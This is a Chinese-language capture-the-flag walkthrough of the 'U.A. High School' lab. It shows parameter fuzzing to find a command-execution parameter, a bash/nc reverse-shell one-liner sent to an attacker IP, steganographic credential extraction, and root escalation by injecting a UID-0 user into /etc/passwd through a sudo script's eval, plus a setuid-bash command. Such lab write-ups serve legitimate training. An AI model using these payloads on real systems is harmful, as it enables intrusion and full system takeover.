---
icon: pen-to-square
date: 2025-05-07
tags: 
title: U.A. High School
category:
  - 项目
---
## 解题过程
端口扫描和网站爆破之后没有发现可以利用的点
但是在http://10.10.74.25/assets/images的响应很有趣
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250507213758.png)

证明了网页的存在，当访问http://10.10.36.251/assets/时，我们可以发现设置了`session`这意味着我们很可能访问了某个php文件

发现是个php文件后就有了一点操作空间，可以用模糊测试对php的参数进行碰撞
构造命令进行碰撞
```bash
ffuf -u 'http://10.10.85.228/assets/index.php?FUZZ=id' -mc all -ic -t 100 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -fs 0
```
1. ​**​`-u 'http://10.10.85.228/assets/index.php?FUZZ=id'`​**​
    - ​**​作用​**​：指定目标 URL，`FUZZ` 是占位符，表示此处会被字典中的词替换。
    - ​**​示例​**​：若字典中有词 `user`，则实际请求为 `http://.../index.php?user=id`。
2. ​**​`-mc all`​**​
    - ​**​作用​**​：匹配所有 HTTP 状态码（`-mc` 表示 "match HTTP status code"）。
    - ​**​注意​**​：默认情况下，`ffuf` 仅显示状态码为 200、204、301 等的响应。使用 `all` 会显示所有状态码的响应（可能包含误报）。
3. ​**​`-ic`​**​
    - ​**​作用​**​：忽略响应中的 HTML 注释（`ignore comments`），避免因注释内容干扰结果判断。
4. ​**​`-t 100`​**​
    - ​**​作用​**​：设置并发线程数为 100，提高扫描速度。
5. ​**​`-w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt`​**​
    - ​**​作用​**​：指定用于替换 `FUZZ` 的字典文件路径（常见 Web 参数名的小写单词列表）。
6. ​**​`-fs 0`​**​
    - ​**​作用​**​：过滤（不显示）响应体大小为 0 的结果（`fs` 表示 "filter response size"）。
    - ​**​意图​**​：排除无实际内容的响应（如空页面或错误响应）。
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192204.png)

搜索到参数`cmd`
似乎时RCE漏洞，试试看
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508192422.png)
似乎是base64加密
解一下码看看
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508194401.png)
接下来高端操作来了
### 反弹shell
首先监听反射端口
```bash
nc -lvnp 1232
```
然后构造命令

```bash
curl -s 'http://10.10.38.88/assets/index.php' -G --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.50.132 1232 >/tmp/f'
```
这个目录有个可以的txt文件
```bash
/var/www/Hidden_Content
```

内容：`AllmightForEver!!!`


按下不表，继续看目录
然后看看assesst之前不让访问的目录
发现有一个`oneforall.jpg`图片，这是没使用过的资源，或者说这里确实有些跳跃，直接进入到

### 图片隐写提取
**图片恢复**
通过访问`http://10.10.38.88/assets/images/oneforall.jpg`将图片拉到本地
发现无法打开，进行图片恢复
010打开发现魔术字节为PNG，
手动恢复前几个字节
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508205950.png)

```hex
FF D8 FF E0 00 10 4A 46 49 46
```
图片显示正确
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508210008.png)

`binwalk`无法分离出有效文件
尝试`steghide`对隐写进行提取
```bash
steghide extract -sf oneforall.jpg
```
密码就是之前`Hidden_Content`目录下的文件
`AllmightForEver!!!`
发现密码
```bash
└─# cat creds.txt
Hi Deku, this is the only way I've found to give you your account credentials, as soon as you have them, delete this file:

deku:One?For?All_!!one1/A
```

接下来，尝试连接ssh。
`deku`
`One?For?All_!!one1/A`
连接成功
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508211219.png)

拿到第一个flag
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250508211615.png)
查看当前用户的权限
```bash
deku@myheroacademia:~$ sudo -l
[sudo] password for deku:
Matching Defaults entries for deku on myheroacademia:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User deku may run the following commands on myheroacademia:
    (ALL) /opt/NewComponent/feedback.sh
```
提示在系统 `myheroacademia` 上，用户 `deku` 被允许以 ​**​root 权限（`(ALL)`）​**​ 执行以下命令：

```bash
/opt/NewComponent/feedback.sh
```

查看脚本的权限，我们的用户拥有它。所以，我们应该能够修改它。
```bash
deku@myheroacademia:~$ ls -la /opt/NewComponent/feedback.sh
-r-xr-xr-x 1 deku deku 684 Jan 23  2024 /opt/NewComponent/feedback.sh
```

但是如果我们尝试直接输入提权命令到那个文件，我们可以看到这是不允许的。
```bash
deku@myheroacademia:~$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > /opt/NewComponent/feedback.sh
-bash: /opt/NewComponent/feedback.sh: Operation not permitted
```

列出文件的属性，我们可以看到标志已设置，这阻止了我们修改它.
```bash
deku@myheroacademia:/opt/NewComponent$ lsattr feedback.sh
----i---------e----- feedback.sh

```

由于我们无法修改它，让我们检查一下脚本内容。
```bash
#!/bin/bash

echo "Hello, Welcome to the Report Form       "
echo "This is a way to report various problems"
echo "    Developed by                        "
echo "        The Technical Department of U.A."

echo "Enter your feedback:"
read feedback

if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"

    echo "$feedback" >> /var/log/feedback.txt
    echo "Feedback successfully saved."
else
    echo "Invalid input. Please provide a valid input."
fi
```
该脚本通过 `eval "echo $feedback"` 直接执行用户输入的内容，虽然过滤了部分特殊字符（如反引号 `` ` ``、`$(`），但过滤不彻底，依据可以输入`>以及/`攻击者可构造恶意输入绕过限制，注入任意命令。
- 输入 `$(malicious_command)` 或 `${ls,-la}` 等格式，执行系统命令。
```bash
eval echo $(chmod +s /bin/bash)
```

`mkpasswd` 是一个用于 ​**​生成密码哈希值​**​ 的命令行工具，常见于 Linux 系统（通常包含在 `whois` 软件包中）。
```bash
mkpasswd -m md5crypt -s
```
- ​**​核心用途​**​：将明文密码转换为哈希值（用于安全存储或认证）。
**参数解析**
```
-m md5crypt
```
- 指定使用 ​**​MD5-based crypt 算法​**​（旧版 Linux 系统的默认密码哈希算法）。
- -s: 从键盘读取输入
我们随便指定一个密码，生成`linux`的用户密码哈希
```bash
┌──(root㉿localhost)-[~]
└─# mkpasswd -m md5crypt -s
Password: 123
$1$wG73jJds$9XZDWLWoF7fvXjw9Sv2f9.
```

接下来我们利用f`eedback.sh`的root权限写入用户以及密码
```bash
deku@myheroacademia:/opt/NewComponent$ sudo ./feedback.sh
[sudo] password for deku:
Hello, Welcome to the Report Form
This is a way to report various problems
    Developed by
        The Technical Department of U.A.
Enter your feedback:
'jxf:$1$MgMMCplp$bx1JXnOEyOXMkHf9VnHgK0:0:0:jxf:/root:/bin/bash' >> /etc/passwd
It is This:
Feedback successfully saved.
```

`tail -n1 /etc/passwd`查看`passwd`的最后一行。是否写入用户密码。
`username:x:UID:GID:用户描述:主目录:登录Shell`

切换用户
```
su -jxf
```

`wc -c root.txt`